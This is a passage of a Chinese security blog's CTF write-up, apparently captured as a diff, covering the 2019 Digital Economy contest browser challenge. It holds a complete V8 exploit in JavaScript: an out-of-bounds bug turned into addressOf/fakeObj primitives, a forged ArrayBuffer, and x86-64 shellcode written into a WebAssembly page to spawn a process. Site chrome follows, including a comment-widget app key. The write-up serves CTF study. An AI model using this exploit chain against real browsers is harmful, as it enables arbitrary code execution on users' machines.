dv.setUint32(<span class="number">4</span>,low,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f64</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">    dv.setBigUint64(<span class="number">0</span>,BigInt(val),<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv.getFloat64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64f</span>(<span class="params">val</span>)</span>&#123;</span><br><span class="line">    dv.setFloat64(<span class="number">0</span>,val,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span> dv.getBigUint64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">30</span>);</span><br><span class="line"><span class="keyword">var</span> arb_double_addr = [<span class="number">1.1</span>,<span class="number">2.2</span>];</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_arr = [obj];</span><br><span class="line">array[<span class="number">0</span>] = <span class="number">0x123</span>;</span><br><span class="line"><span class="comment">//%DebugPrint(array);</span></span><br><span class="line"><span class="comment">//%DebugPrint(arb_double_addr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line">array.coin(<span class="number">0x123</span>,val);</span><br><span class="line"><span class="comment">// now we have a oob arr</span></span><br><span class="line"><span class="comment">// get double array's map</span></span><br><span class="line"><span class="keyword">var</span> double_map = arb_double_addr[<span class="number">2</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]get the map of double arr : "</span> + double_map.toString());</span><br><span class="line"><span class="comment">// get obj array's map</span></span><br><span class="line"><span class="keyword">var</span> obj_map = arb_double_addr[<span class="number">0x10</span>];</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+]get the map of obj arr : "</span> + hex(u64f(obj_map)));</span><br><span class="line"><span class="comment">// addressOf and obj function</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj1</span>)</span>&#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj1;</span><br><span class="line">    arb_double_addr[<span class="number">0x10</span>] = double_map;</span><br><span class="line">    <span class="keyword">var</span> addr = u64f(obj_arr[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    arb_double_addr[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf2</span>(<span class="params">obj1</span>)</span>&#123;</span><br><span class="line">    obj_arr[<span class="number">0</span>] = obj1;</span><br><span class="line">    arb_double_addr[<span class="number">0x10</span>] = double_map;</span><br><span class="line">    <span class="keyword">var</span> addr = u64f(obj_arr[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    arb_double_addr[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObj</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line">    arb_double_addr[<span class="number">0x10</span>] = double_map;</span><br><span class="line">    obj_arr[<span class="number">0</span>] = i2f64(addr+<span class="number">1n</span>);</span><br><span class="line">    arb_double_addr[<span class="number">0x10</span>] = obj_map;</span><br><span class="line">    <span class="keyword">var</span> fake_obj = obj_arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> fake_obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0x00</span>,<span class="number">0x61</span>,<span class="number">0x73</span>,<span class="number">0x6D</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x85</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x60</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x7F</span>,<span class="number">0x03</span>,<span class="number">0x82</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x70</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0x83</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x06</span>,<span class="number">0x81</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x07</span>,<span class="number">0x91</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0x06</span>,<span class="number">0x6D</span>,<span class="number">0x65</span>,<span class="number">0x6D</span>,<span class="number">0x6F</span>,<span class="number">0x72</span>,<span class="number">0x79</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x04</span>,<span class="number">0x6D</span>,<span class="number">0x61</span>,<span class="number">0x69</span>,<span class="number">0x6E</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x0A</span>,<span class="number">0x8A</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x84</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x80</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x2A</span>,<span class="number">0x0B</span>]);</span><br><span class="line"><span class="keyword">const</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>([<span class="number">186</span>,<span class="number">114176</span>,<span class="number">46071808</span>,<span class="number">3087007744</span>,<span class="number">41</span>,<span class="number">2303198479</span>,<span class="number">3091735556</span>,<span class="number">487129090</span>,<span class="number">16777343</span>,<span class="number">608471368</span>,<span class="number">1153910792</span>,<span class="number">4132</span>,<span class="number">2370306048</span>,<span class="number">1208493172</span>,<span class="number">3122936971</span>,<span class="number">16</span>,<span class="number">10936</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">50887</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">1015760901</span>,<span class="number">3334948900</span>,<span class="number">1</span>,<span class="number">8632</span>,<span class="number">1208291072</span>,<span class="number">1210334347</span>,<span class="number">181959</span>,<span class="number">565706752</span>,<span class="number">251658240</span>,<span class="number">800606213</span>,<span class="number">795765090</span>,<span class="number">1207986291</span>,<span class="number">1210320009</span>,<span class="number">1210334349</span>,<span class="number">50887</span>,<span class="number">3343384576</span>,<span class="number">194</span>,<span class="number">3913728</span>,<span class="number">84869120</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule);</span><br><span class="line"><span class="keyword">var</span> func = wasmInstance.exports.main;</span><br><span class="line"><span class="keyword">var</span> fake = [<span class="number">0.0</span>,<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>,<span class="number">6.6</span>,<span class="number">7.7</span>,<span class="number">8.8</span>,<span class="number">9.9</span>];</span><br><span class="line"><span class="keyword">var</span> fake_addr = addressOf(fake);</span><br><span class="line"><span class="keyword">var</span> wasm_shellcode_ptr_addr = addressOf2(wasmInstance) + <span class="number">0x88n</span>;</span><br><span class="line"><span class="keyword">var</span> element_addr = fake_addr - <span class="number">0x50n</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"fake arr addr : "</span> + hex(fake_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"wasm shellcode ptr addr : "</span> + hex(wasm_shellcode_ptr_addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake ArrayBuf's map</span></span><br><span class="line">fake[<span class="number">0</span>] = i2f64(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">1</span>] = i2f64(<span class="number">0x1900042317080808n</span>);</span><br><span class="line">fake[<span class="number">2</span>] = i2f64(<span class="number">0x82003ffn</span>);</span><br><span class="line">fake[<span class="number">3</span>] = i2f64(<span class="number">0n</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake ArrayBuffer</span></span><br><span class="line"></span><br><span class="line">fake[<span class="number">4</span>] = i2f64(element_addr+<span class="number">1n</span>);</span><br><span class="line">fake[<span class="number">5</span>] = i2f64(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">6</span>] = i2f64(<span class="number">0n</span>);</span><br><span class="line">fake[<span class="number">7</span>] = i2f64(<span class="number">0xffffffff</span>);</span><br><span class="line">fake[<span class="number">8</span>] = i2f64(wasm_shellcode_ptr_addr);<span class="comment">//backing_store</span></span><br><span class="line">fake[<span class="number">9</span>] = i2f64(<span class="number">0x2n</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> arb_arrry_buf = fakeObj(element_addr+<span class="number">0x20n</span>);</span><br><span class="line"><span class="keyword">var</span> adv = <span class="keyword">new</span> <span class="built_in">DataView</span>(arb_arrry_buf);</span><br><span class="line"><span class="keyword">var</span> wasm_shellcode_addr = adv.getBigUint64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"wasm shellcode addr : "</span> + hex(wasm_shellcode_addr));</span><br><span class="line"></span><br><span class="line">fake[<span class="number">8</span>] = i2f64(wasm_shellcode_addr);</span><br><span class="line"><span class="comment">// replace sc</span></span><br><span class="line"><span class="keyword">let</span> sc = [</span><br><span class="line">		<span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">46</span>, <span class="number">121</span>, <span class="number">98</span>,</span><br><span class="line">		<span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">47</span>, <span class="number">117</span>, <span class="number">115</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">98</span>,</span><br><span class="line">		<span class="number">105</span>, <span class="number">110</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">231</span>, <span class="number">104</span>, <span class="number">59</span>, <span class="number">49</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">129</span>, <span class="number">52</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">		<span class="number">72</span>, <span class="number">184</span>, <span class="number">68</span>, <span class="number">73</span>, <span class="number">83</span>, <span class="number">80</span>, <span class="number">76</span>, <span class="number">65</span>, <span class="number">89</span>, <span class="number">61</span>, <span class="number">80</span>, <span class="number">49</span>, <span class="number">210</span>, <span class="number">82</span>, <span class="number">106</span>, <span class="number">8</span>, <span class="number">90</span>,</span><br><span class="line">		<span class="number">72</span>, <span class="number">1</span>, <span class="number">226</span>, <span class="number">82</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">226</span>, <span class="number">72</span>, <span class="number">184</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">80</span>, <span class="number">72</span>,</span><br><span class="line">		<span class="number">184</span>, <span class="number">121</span>, <span class="number">98</span>, <span class="number">96</span>, <span class="number">109</span>, <span class="number">98</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">72</span>, <span class="number">49</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">49</span>, <span class="number">246</span>, <span class="number">86</span>, <span class="number">106</span>, <span class="number">8</span>,</span><br><span class="line">		<span class="number">94</span>, <span class="number">72</span>, <span class="number">1</span>, <span class="number">230</span>, <span class="number">86</span>, <span class="number">72</span>, <span class="number">137</span>, <span class="number">230</span>, <span class="number">106</span>, <span class="number">59</span>, <span class="number">88</span>, <span class="number">15</span>, <span class="number">5</span></span><br><span class="line">	];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;sc.length;i++) &#123;</span><br><span class="line">    <span class="comment">//adv.setUint32(i*4,shellcode[i],true);</span></span><br><span class="line">    adv.setUint8(i,sc[i],<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%SystemBreak();</span><br><span class="line">func();</span><br><span class="line"></span><br><span class="line"><span class="comment">//p64f(1,2);</span></span><br><span class="line"><span class="comment">//i2f64(1);</span></span><br><span class="line"><span class="comment">//u64f(1.1);</span></span><br><span class="line"><span class="comment">//%DebugPrint(arb_double_addr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(obj_arr);</span></span><br><span class="line"><span class="comment">//%DebugPrint(buf);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"xmzyshypnc"</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/225443#h3-6" target="_blank" rel="noopener">OOB类型的v8逃逸总结</a></p>
+<p><a href="https://e3pem.github.io/2019/11/20/browser/%E6%95%B0%E5%AD%97%E7%BB%8F%E6%B5%8E%E7%BA%BF%E4%B8%8B-Browser/" target="_blank" rel="noopener">数字经济线下-Browser</a></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持将鼓励我继续创作</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="ama2in9 WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="ama2in9 Alipay">
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/02/04/cve-2021-3156/" rel="next" title="CVE-2021-3156 sudo 提权漏洞复现与分析">
+                <i class="fa fa-chevron-left"></i> CVE-2021-3156 sudo 提权漏洞复现与分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/head.png" alt="ama2in9">
+            
+              <p class="site-author-name" itemprop="name">ama2in9</p>
+              <p class="site-description motion-element" itemprop="description">Seeing how far I have been.</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">78</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">33</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">5</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+            <div class="links-of-author motion-element">
+              
+                <span class="links-of-author-item">
+                  <a href="https://github.com/xmzyshypnc" target="_blank" title="GitHub"><i class="fa fa-fw fa-github"></i>GitHub</a>
+                  
+                </span>
+              
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.piddnad.cn/" title="Piddnad" target="_blank">Piddnad</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://linkleyping.top/" title="Ep" target="_blank">Ep</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://p4nda.top/" title="P4nda" target="_blank">P4nda</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://sunichi.github.io/" title="Sunichi" target="_blank">Sunichi</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://e3pem.github.io/" title="E3pem" target="_blank">E3pem</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://litch1.club/" title="Litch1" target="_blank">Litch1</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://xiaoxiaorenwu.top/" title="xiaoxiaorenwu" target="_blank">xiaoxiaorenwu</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://v1ckydxp.github.io/" title="v1cky" target="_blank">v1cky</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://swordfaith.github.io/" title="swordfaith" target="_blank">swordfaith</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://harmoc.com/" title="harmoc" target="_blank">harmoc</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://t3ls.club/" title="t3ls" target="_blank">t3ls</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#2019-数字经济大赛决赛-Browser"><span class="nav-number">1.</span> <span class="nav-text">2019-数字经济大赛决赛-Browser</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.2.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">1.3.</span> <span class="nav-text">参考</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ama2in9</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.9.0</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Pisces</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+  
+    <script id="dsq-count-scr" src="https://xmzyshypnc.disqus.com/count.js" async></script>
+  
+
+  
+    <script type="text/javascript">
+      var disqus_config = function () {
+        this.page.url = 'http://ama2in9.top/2021/03/05/shuzijingji/';
+        this.page.identifier = '2021/03/05/shuzijingji/';
+        this.page.title = '2019-数字经济大赛决赛-Browser';
+        };
+      function loadComments () {
+        var d = document, s = d.createElement('script');
+        s.src = 'https://xmzyshypnc.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      }
+      
+        loadComments();
+      
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  
+  
+  <script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: true,
+        notify: true,
+        appId: 'YbpHIa6XHNsKv4wX2wGjnrK7-gzGzoHsz',
+        appKey: '1fjf9mQl90nKdRPfq1zhDyIE',
+        placeholder: 'Just go go',
+        avatar:'mm',
+        meta:guest,
+        pageSize:'10' || 10,
+        visitor: true
+    });
+  </script>
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
